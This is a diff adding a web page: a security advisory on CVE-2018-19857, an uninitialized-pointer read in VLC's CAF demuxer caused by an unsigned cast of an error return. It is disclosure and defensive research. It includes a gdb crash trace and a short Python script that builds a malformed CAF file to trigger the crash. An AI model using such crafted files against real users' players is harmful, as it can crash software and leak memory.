@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CVE-2018-19857: vlc: uninitialized memory read in caf demuxer | Hans Jerry Illikainen</title>
+    <link rel="alternate" type="application/atom+xml" href="/feed.xml">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/highlight.css">
+    <link rel="stylesheet"
+          type="text/css"
+          href="https://use.fontawesome.com/releases/v5.5.0/css/all.css"
+          integrity="sha256-nkysZcel7gvQdDr+/KvdPnOFThKErJrEM4E9YjH1UPI="
+          crossorigin="anonymous">
+  </head>
+  <body>
+    <header>
+      <h1 class="site-title">Hans Jerry Illikainen</h1>
+      <a class="external-link" href="https://github.com/illikainen">
+        <span class="fab fa-github"></span>
+      </a>
+      <a class="external-link" href="mailto:hji@dyntopia.com">
+        <span class="far fa-envelope"></span>
+      </a>
+      <a class="external-link" href="https://keybase.io/hji">
+        <span class="fab fa-keybase"></span>
+      </a>
+      <nav>
+        
+          
+          <a href="/advisories">advisories</a>
+          
+        
+          
+          <a href="/blog">blog</a>
+          
+        
+          
+          <a href="/exploits">exploits</a>
+          
+        
+          
+        
+      </nav>
+    </header>
+    <div class="content">
+      <div class="item-header">
+  <h1 class="item-title">CVE-2018-19857: vlc: uninitialized memory read in caf demuxer</h1>
+  <span class="item-date">Dec 3, 2018</span>
+</div>
+<div class="item-content">
+  <p>The CAF demuxer in VLC 3.0.4 and the master branch before commit
+0cc5ea748ee5ff7705dde61ab15dff8f58be39d0 may read memory from an
+uninitialized pointer when processing magic cookies in CAF files.</p>
+
+<p>This is caused by a typecast that converts a possibly negative return
+value to an <code class="language-plaintext highlighter-rouge">unsigned int</code> in the function <code class="language-plaintext highlighter-rouge">ReadKukiChunk()</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">vlc/modules/demux/caf.c</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">689</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">ReadKukiChunk</span><span class="p">(</span> <span class="n">demux_t</span> <span class="o">*</span><span class="n">p_demux</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">i_size</span> <span class="p">)</span>
+<span class="mi">690</span> <span class="p">{</span>
+<span class="p">...</span>
+<span class="mi">692</span>     <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">p_peek</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="mi">701</span>     <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">vlc_stream_Peek</span><span class="p">(</span> <span class="n">p_demux</span><span class="o">-&gt;</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p_peek</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i_size</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="n">i_size</span> <span class="p">)</span>
+<span class="mi">702</span>     <span class="p">{</span>
+<span class="mi">703</span>         <span class="n">msg_Err</span><span class="p">(</span> <span class="n">p_demux</span><span class="p">,</span> <span class="s">"Couldn't peek extra data"</span> <span class="p">);</span>
+<span class="mi">704</span>         <span class="k">return</span> <span class="n">VLC_EGENERIC</span><span class="p">;</span>
+<span class="mi">705</span>     <span class="p">}</span>
+</code></pre></div></div>
+
+<p>With a sufficiently large <code class="language-plaintext highlighter-rouge">i_size</code>, an allocation may fail in
+<code class="language-plaintext highlighter-rouge">vlc_stream_Peek()</code>.  This would result in a return value of
+<code class="language-plaintext highlighter-rouge">VLC_ENOMEM</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">vlc/src/input/stream.c</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">494</span> <span class="kt">ssize_t</span> <span class="nf">vlc_stream_Peek</span><span class="p">(</span><span class="n">stream_t</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">**</span><span class="kr">restrict</span> <span class="n">bufp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
+<span class="mi">495</span> <span class="p">{</span>
+<span class="p">...</span>
+<span class="mi">507</span>     <span class="k">if</span> <span class="p">(</span><span class="n">peek</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="mi">508</span>     <span class="p">{</span>
+<span class="mi">509</span>         <span class="n">peek</span> <span class="o">=</span> <span class="n">block_Alloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+<span class="mi">510</span>         <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">peek</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
+<span class="mi">511</span>             <span class="k">return</span> <span class="n">VLC_ENOMEM</span><span class="p">;</span>
+<span class="mi">512</span>
+<span class="mi">513</span>         <span class="n">peek</span><span class="o">-&gt;</span><span class="n">i_buffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="mi">514</span>     <span class="err">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">vlc/include/vlc_common.h</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">475</span> <span class="err">#</span><span class="n">define</span> <span class="n">VLC_ENOMEM</span>         <span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>When casted to an <code class="language-plaintext highlighter-rouge">unsigned int</code>, the comparison of the return value in
+<code class="language-plaintext highlighter-rouge">ReadKukiChunk()</code> won’t notice the failure:</p>
+
+<p><code class="language-plaintext highlighter-rouge">vlc/modules/demux/caf.c</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">701</span>     <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">vlc_stream_Peek</span><span class="p">(</span> <span class="n">p_demux</span><span class="o">-&gt;</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p_peek</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">i_size</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="n">i_size</span> <span class="p">)</span>
+</code></pre></div></div>
+
+<p>The uninitialized <code class="language-plaintext highlighter-rouge">p_peek</code> is then used to read and copy data, depending
+on the codec (see <code class="language-plaintext highlighter-rouge">ProcessALACCookie()</code>, <code class="language-plaintext highlighter-rouge">ProcessAACCookie()</code> and
+<code class="language-plaintext highlighter-rouge">ReadKukiChunk()</code>).  This results in a crash and/or a potential infoleak.</p>
+
+<p>Testcase:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./mkcaf magic.caf
+<span class="nv">$ </span>gdb <span class="nt">--args</span> vlc magic.caf
+<span class="o">(</span>gdb<span class="o">)</span> r
+...
+Thread 9 <span class="s2">"vlc"</span> received signal SIGSEGV, Segmentation fault.
+...
+__memmove_avx_unaligned_erms <span class="o">()</span> at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:364
+364     ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.
+<span class="o">(</span>gdb<span class="o">)</span> x/i <span class="nv">$rip</span>
+<span class="o">=&gt;</span> 0x7ffff6a69f50 &lt;__memmove_avx_unaligned_erms+368 at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:364&gt;:   vmovdqu ymm5,YMMWORD PTR <span class="o">[</span>rsi+rdx<span class="k">*</span>1-0x20]
+...
+<span class="o">(</span>gdb<span class="o">)</span> i r rsi rdx
+rsi            0x7fffd4009a00   0x7fffd4009a00
+rdx            0x41414141       0x41414141
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">mkcaf</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+<span class="n">caff</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="c1"># File header
+</span>    <span class="sa">b</span><span class="s">"caff"</span><span class="p">,</span>                    <span class="c1"># mFileType
+</span>    <span class="n">pack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>              <span class="c1"># mFileVersion
+</span>    <span class="n">pack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>              <span class="c1"># mFileFlags
+</span>
+    <span class="c1"># Magic cookie chunk header
+</span>    <span class="sa">b</span><span class="s">"kuki"</span><span class="p">,</span>                    <span class="c1"># mChunkType
+</span>    <span class="n">pack</span><span class="p">(</span><span class="s">"&gt;Q"</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">),</span>     <span class="c1"># mChunkSize
+</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"usage: {} &lt;filename&gt;"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">caff</span><span class="p">))</span>
+    <span class="k">return</span> <span class="mi">0</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h2 id="solution">Solution</h2>
+
+<p>This issue has been assigned CVE-2018-19857 and it is fixed in the VLC
+master branch[1].</p>
+
+<h2 id="references">References</h2>
+
+<ol>
+  <li><a href="https://git.videolan.org/?p=vlc.git;a=commit;h=0cc5ea748ee5ff7705dde61ab15dff8f58be39d0">https://git.videolan.org/?p=vlc.git;a=commit;h=0cc5ea748ee5ff7705dde61ab15dff8f58be39d0</a></li>
+</ol>
+
+</div>
+
+    </div>
+  </body>
+</html>
